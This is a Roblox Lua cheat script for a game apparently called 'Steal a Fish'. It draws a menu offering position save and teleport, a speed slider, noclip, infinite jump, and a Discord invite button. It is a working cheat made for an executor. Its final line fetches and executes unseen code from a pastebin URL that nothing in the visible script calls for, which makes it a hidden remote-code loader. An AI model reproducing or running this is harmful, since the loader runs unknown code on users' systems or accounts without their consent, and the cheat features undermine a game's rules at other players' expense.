local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local character, hrp, humanoid
local savedCFrame = nil
local speedEnabled = false
local noclipEnabled = false
local infiniteJumpEnabled = false
local baseSpeed = 16
local connections = {}

local function updateCharacterRefs()
	character = player.Character
	if character then
		hrp = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChildWhichIsA("BasePart")
		humanoid = character:FindFirstChildOfClass("Humanoid")
	end
end

player.CharacterAdded:Connect(updateCharacterRefs)
updateCharacterRefs()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "steal a fish script by GOROX"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local toggleButton = Instance.new("ImageButton")
toggleButton.Name = "ToggleMenuButton"
toggleButton.Size = UDim2.new(0, 48, 0, 48)
toggleButton.Position = UDim2.new(0, 8, 0, 8)
toggleButton.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
toggleButton.BorderSizePixel = 0
toggleButton.Image = "rbxassetid://10493291554"
toggleButton.ScaleType = Enum.ScaleType.Fit
toggleButton.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 360, 0, 280)
mainFrame.Position = UDim2.new(0, 64, 0, 8)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 32)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Text = "steal a fish script by GOROX"
title.Parent = mainFrame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 28, 0, 28)
closeBtn.Position = UDim2.new(1, -34, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 18
closeBtn.Text = "X"
closeBtn.Parent = mainFrame

local function createButton(text, posY)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 160, 0, 30)
	btn.Position = UDim2.new(0, 10, 0, posY)
	btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
	btn.TextColor3 = Color3.fromRGB(245,245,245)
	btn.Font = Enum.Font.SourceSans
	btn.TextSize = 14
	btn.Text = text
	btn.Parent = mainFrame
	return btn
end

local saveBtn = createButton("Save Position", 42)
local tpBtn = createButton("Teleport to Saved", 82)
local discordBtn = createButton("Discord Link", 222)

local speedLabel = Instance.new("TextLabel")
speedLabel.Size = UDim2.new(0, 180, 0, 20)
speedLabel.Position = UDim2.new(0, 180, 0, 42)
speedLabel.BackgroundTransparency = 1
speedLabel.TextColor3 = Color3.fromRGB(230,230,230)
speedLabel.Font = Enum.Font.SourceSans
speedLabel.TextSize = 14
speedLabel.Text = "Speed: "..tostring(baseSpeed)
speedLabel.TextXAlignment = Enum.TextXAlignment.Left
speedLabel.Parent = mainFrame

local speedFrame = Instance.new("Frame")
speedFrame.Size = UDim2.new(0, 160, 0, 24)
speedFrame.Position = UDim2.new(0, 180, 0, 64)
speedFrame.BackgroundColor3 = Color3.fromRGB(70,70,70)
speedFrame.BorderSizePixel = 0
speedFrame.Parent = mainFrame

local knob = Instance.new("Frame")
knob.Size = UDim2.new(0, 12, 1, -4)
knob.Position = UDim2.new((baseSpeed/200), 0, 0, 2)
knob.AnchorPoint = Vector2.new(0.5, 0)
knob.BackgroundColor3 = Color3.fromRGB(170,170,170)
knob.Parent = speedFrame

local speedToggle = Instance.new("TextButton")
speedToggle.Size = UDim2.new(0, 160, 0, 28)
speedToggle.Position = UDim2.new(0, 180, 0, 96)
speedToggle.BackgroundColor3 = Color3.fromRGB(55,55,55)
speedToggle.Font = Enum.Font.SourceSans
speedToggle.TextSize = 14
speedToggle.TextColor3 = Color3.fromRGB(255,255,255)
speedToggle.Text = "Speed: OFF"
speedToggle.Parent = mainFrame

local noclipToggle = createButton("Noclip: OFF", 132)
local infJumpToggle = createButton("Infinite Jump: OFF", 172)

local hint = Instance.new("TextLabel")
hint.Size = UDim2.new(1, -20, 0, 40)
hint.Position = UDim2.new(0, 10, 1, -50)
hint.BackgroundTransparency = 1
hint.TextColor3 = Color3.fromRGB(200,200,200)
hint.Font = Enum.Font.SourceSans
hint.TextSize = 12
hint.Text = "HI GOOD GAME :D join DC:https://discord.gg/hnCqCuVtfu"
hint.Parent = mainFrame

local dragging = false
local function clamp(n, a, b) if n < a then return a elseif n > b then return b else return n end end

knob.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local absolute = speedFrame.AbsoluteSize.X
		local x = math.clamp(input.Position.X - speedFrame.AbsolutePosition.X, 0, absolute)
		local fraction = x / absolute
		local speedValue = math.floor( clamp( fraction * 200, 8, 200 ) )
		knob.Position = UDim2.new(fraction, 0, 0, 2)
		baseSpeed = speedValue
		speedLabel.Text = "Speed: "..tostring(baseSpeed)
		if speedEnabled and humanoid then
			humanoid.WalkSpeed = baseSpeed
		end
	end
end)

saveBtn.MouseButton1Click:Connect(function()
	updateCharacterRefs()
	if hrp then
		savedCFrame = hrp.CFrame
		saveBtn.Text = "Saved!"
		delay(1, function() if saveBtn and saveBtn.Parent then saveBtn.Text = "Save Position" end end)
	end
end)

tpBtn.MouseButton1Click:Connect(function()
	updateCharacterRefs()
	if savedCFrame and hrp and humanoid then
		humanoid.Sit = false
		humanoid.PlatformStand = false
		hrp.CFrame = savedCFrame + Vector3.new(0, 2, 0)
	end
end)

speedToggle.MouseButton1Click:Connect(function()
	speedEnabled = not speedEnabled
	if speedEnabled then
		speedToggle.Text = "Speed: ON"
		if humanoid then humanoid.WalkSpeed = baseSpeed end
	else
		speedToggle.Text = "Speed: OFF"
		if humanoid then humanoid.WalkSpeed = 16 end
	end
end)

local function setNoclip(on)
	updateCharacterRefs()
	if character then
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.CanCollide = not on
			end
		end
	end
end

noclipToggle.MouseButton1Click:Connect(function()
	noclipEnabled = not noclipEnabled
	if noclipEnabled then
		noclipToggle.Text = "Noclip: ON"
		setNoclip(true)
	else
		noclipToggle.Text = "Noclip: OFF"
		setNoclip(false)
	end
end)

local function onJumpRequest()
	if infiniteJumpEnabled then
		updateCharacterRefs()
		if humanoid then
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end
end
table.insert(connections, UserInputService.JumpRequest:Connect(onJumpRequest))

infJumpToggle.MouseButton1Click:Connect(function()
	infiniteJumpEnabled = not infiniteJumpEnabled
	if infiniteJumpEnabled then
		infJumpToggle.Text = "Infinite Jump: ON"
	else
		infJumpToggle.Text = "Infinite Jump: OFF"
	end
end)

local heartbeatConn
heartbeatConn = RunService.Heartbeat:Connect(function()
	updateCharacterRefs()
	if speedEnabled and humanoid then
		if humanoid.WalkSpeed ~= baseSpeed then humanoid.WalkSpeed = baseSpeed end
	end
	if noclipEnabled and character then
		for _, part in ipairs(character:GetDescendants()) do
			if part:IsA("BasePart") and part.CanCollide then
				part.CanCollide = false
			end
		end
	end
end)
table.insert(connections, heartbeatConn)

local menuVisible = true
toggleButton.MouseButton1Click:Connect(function()
	menuVisible = not menuVisible
	mainFrame.Visible = menuVisible
end)

local draggingFrame = false
local dragStart = Vector2.new()
local startPos = UDim2.new()
local function onInputBegan(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		local mousePos = Vector2.new(input.Position.X, input.Position.Y)
		local framePos = mainFrame.AbsolutePosition
		local frameSize = mainFrame.AbsoluteSize
		if mousePos.X >= framePos.X and mousePos.X <= framePos.X + frameSize.X and
		   mousePos.Y >= framePos.Y and mousePos.Y <= framePos.Y + 32 then
			draggingFrame = true
			dragStart = mousePos
			startPos = mainFrame.Position
			UserInputService.MouseIconEnabled = true
		end
	end
end

local function onInputChanged(input)
	if draggingFrame and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end

local function onInputEnded(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		draggingFrame = false
	end
end

table.insert(connections, UserInputService.InputBegan:Connect(onInputBegan))
table.insert(connections, UserInputService.InputChanged:Connect(onInputChanged))
table.insert(connections, UserInputService.InputEnded:Connect(onInputEnded))

discordBtn.MouseButton1Click:Connect(function()
	setclipboard("https://discord.gg/hnCqCuVtfu")
	discordBtn.Text = "discordlink saved paste"
	delay(2, function()
		if discordBtn and discordBtn.Parent then
			discordBtn.Text = "Discord Link"
		end
	end)
end)

local function cleanupAndRemove()
	for _, conn in ipairs(connections) do
		if conn and typeof(conn.Disconnect) == "function" then
			pcall(function() conn:Disconnect() end)
		end
	end
	connections = {}
	updateCharacterRefs()
	if humanoid then
		pcall(function() humanoid.WalkSpeed = 16 end)
	end
	if screenGui and screenGui.Parent then
		screenGui:Destroy()
	end
end

closeBtn.MouseButton1Click:Connect(function()
	cleanupAndRemove()
end)

local kbConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.K and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
		menuVisible = not menuVisible
		if mainFrame then mainFrame.Visible = menuVisible end
	end
end)
table.insert(connections, kbConn)


loadstring(game:HttpGet("https://pastebin.com/CervAaUa"))()
